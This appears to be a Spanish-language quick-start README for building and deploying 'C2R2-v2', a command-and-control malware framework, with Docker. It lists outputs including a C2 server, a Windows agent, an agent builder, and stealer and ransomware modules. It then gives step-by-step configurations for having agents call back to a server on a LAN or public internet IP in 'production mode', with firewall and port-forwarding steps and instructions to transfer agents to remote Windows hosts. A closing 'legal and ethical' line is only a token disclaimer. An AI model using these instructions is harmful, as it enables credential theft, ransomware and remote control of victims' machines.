#  Guía de Inicio Rápido - Docker Build

Esta guía te ayudará a compilar todo C2R2-v2 en menos de 5 minutos.

##  Compilación Super Rápida

```bash
# 1. Clonar el repositorio
git clone https://github.com/G4sp4rCS/C2R2-v2.git
cd C2R2-v2

# 2. Configurar (opcional - usa valores por defecto si se omite)
cp .env.example .env
nano .env

# 3. Compilar TODO
docker-compose up --build

# 4. ¡Listo! Tus binarios están en dist/
ls -lh dist/
```

##  ¿Qué obtienes?

Después de la compilación, en el directorio `dist/` encontrarás:

```
dist/
├── c2r2-server           # ← Servidor C2 (ejecuta en Linux)
├── agent.exe             # ← Agente Windows (ejecuta en Windows)
├── builder               # ← Builder (genera más agentes)
├── stealer.dll           # ← Módulo stealer
├── ransomware.dll        # ← Módulo ransomware
├── modules/              # ← Módulos encriptados
│   ├── stealer.enc
│   ├── stealer.key
│   ├── ransomware.enc
│   └── ransomware.key
└── BUILD_INFO.txt        # ← Información de compilación
```

##  Ejemplos Prácticos

### Ejemplo 1: Testing Local

```bash
# Configurar en .env
SERVER_IP=127.0.0.1
SERVER_PORT=4444
AGENT_NAME=agent-test
PRODUCTION_MODE=false

# Compilar
docker-compose up --build

# Usar
cd dist
./c2r2-server --bind 0.0.0.0 --port 4444
```

### Ejemplo 2: Red Local (LAN)

```bash
# Configurar en .env
SERVER_IP=192.168.1.100
SERVER_PORT=4444
AGENT_NAME=agent-lan
PRODUCTION_MODE=false

# Compilar
docker-compose up --build

# Usar
cd dist
./c2r2-server --bind 0.0.0.0 --port 4444
# Transferir agent-lan.exe a Windows en la LAN
```

### Ejemplo 3: Producción (Internet)

```bash
# Configurar en .env (tu IP pública)
SERVER_IP=203.0.113.50
SERVER_PORT=4444
AGENT_NAME=agent-prod
PRODUCTION_MODE=true

# Compilar
docker-compose up --build

# Configurar firewall
sudo ufw allow 4444/tcp

# Usar
cd dist
./c2r2-server --bind 0.0.0.0 --port 4444
# Transferir agent-prod.exe a Windows remoto
```

##  Comandos Útiles

```bash
# Compilar con parámetros en línea
SERVER_IP=192.168.1.10 docker-compose up --build

# Compilar modo producción
PRODUCTION_MODE=true docker-compose up --build

# Usar el script helper
./docker-build.sh --ip 192.168.1.10 --production

# Limpiar todo
docker-compose down
docker rmi c2r2-builder:latest
rm -rf dist/
```

##  Documentación Completa

Para más detalles, consulta:
- **[DOCKER.md](DOCKER.md)** - Guía completa de Docker
- **[README principal](../../README.md)** - Documentación principal
- **[BUILD.md](BUILD.md)** - Modos de compilación

##  Notas Importantes

- **Desarrollo vs Producción**: Usa `PRODUCTION_MODE=false` para testing y `true` para operaciones reales
- **IP del Servidor**: Usa `127.0.0.1` para local, IP privada para LAN, IP pública para Internet
- **Firewall**: Recuerda abrir el puerto en el firewall: `sudo ufw allow 4444/tcp`
- **Port Forwarding**: Para Internet, configura port forwarding en tu router

---

** ¡A hackear! (de forma legal y ética, por supuesto)**
